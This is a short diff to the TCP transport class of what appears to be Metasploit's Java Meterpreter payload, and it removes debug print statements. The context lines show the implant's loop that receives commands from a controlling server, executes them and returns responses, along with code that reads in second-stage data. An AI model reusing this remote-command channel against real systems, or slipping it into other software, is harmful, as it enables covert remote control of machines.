@@ -86,8 +86,6 @@ public class TcpTransport extends Transport {
         int portStart = url.lastIndexOf(":");
         this.port = Integer.parseInt(url.substring(portStart + 1));
         this.host = url.substring(url.lastIndexOf("/") + 1, portStart);
-        System.out.println("msf : Host: " + this.host);
-        System.out.println("msf : Port: " + this.port);
     }
 
     public void bind(DataInputStream in, OutputStream rawOut) {
@@ -116,7 +114,6 @@ public class TcpTransport extends Transport {
     protected boolean tryConnect(Meterpreter met) throws IOException {
         if (this.inputStream != null) {
             // we're already connected
-            System.out.println("msf : Connecting on existing transport");
             return true;
         }
 
@@ -151,40 +148,32 @@ public class TcpTransport extends Transport {
     public void writePacket(TLVPacket packet, int type) throws IOException {
         byte[] data = packet.toByteArray();
         synchronized (this.outputStream) {
-            System.out.println("msf : sending response");
             this.outputStream.writeInt(data.length + 8);
             this.outputStream.writeInt(type);
             this.outputStream.write(data);
             this.outputStream.flush();
-            System.out.println("msf : sent response");
         }
     }
 
     public boolean dispatch(Meterpreter met) {
-        System.out.println("msf : In the dispatch loop");
         long lastPacket = System.currentTimeMillis();
         int result = 0;
         while (!met.hasSessionExpired() &&
             System.currentTimeMillis() < lastPacket + this.commTimeout) {
             try {
-                System.out.println("msf : Waiting for packet");
                 TLVPacket request = this.readPacket();
 
                 if (request == null) {
                     continue;
                 }
 
-                System.out.println("msf : Packet received");
-
                 // got a packet, update the timestamp
                 lastPacket = System.currentTimeMillis();
 
                 TLVPacket response = request.createResponse();
                 result = met.getCommandManager().executeCommand(met, request, response);
-                System.out.println("msf : command executed: " + result);
 
                 this.writePacket(response, TLVPacket.PACKET_TYPE_RESPONSE);
-                System.out.println("msf : response sent");
 
                 if (result == Command.EXIT_DISPATCH) {
                     return true;
@@ -192,18 +181,15 @@ public class TcpTransport extends Transport {
             } catch (SocketTimeoutException ex) {
                 // socket comms timeout, didn't get a packet,
                 // this is ok, so we ignore it
-                System.out.println("msf : Socket timeout (OK)");
             } catch (SocketException ex) {
                 // sometimes we'll have issues where writing a response when we're exiting
                 // the dispatch is intended, so we'll check for that here too
                 if (result == Command.EXIT_DISPATCH) {
-                    System.out.println("msf : Exception in exit of dispatch, indicating intention");
                     return true;
                 }
             }
             catch (Exception ex) {
                 // any other type of exception isn't good.
-                System.out.println("msf : Some other exception: " + ex.getClass().getName());
                 break;
             }
         }
@@ -215,11 +201,8 @@ public class TcpTransport extends Transport {
     private void flushInputStream(int blocks) throws IOException {
         // we can assume that the server is trying to send the second
         // stage at this point, so let's just read that in for now.
-        System.out.println("msf : Flushing the input stream, blocks is " + blocks);
         for (int i = 0; i < blocks; i++) {
-            System.out.println("msf : Flushing the input stream: " + i);
             int blobLen = this.inputStream.readInt();
-            System.out.println("msf : Discarding bytes: " + blobLen);
             byte[] throwAway = new byte[blobLen];
             this.inputStream.readFully(throwAway);
         }
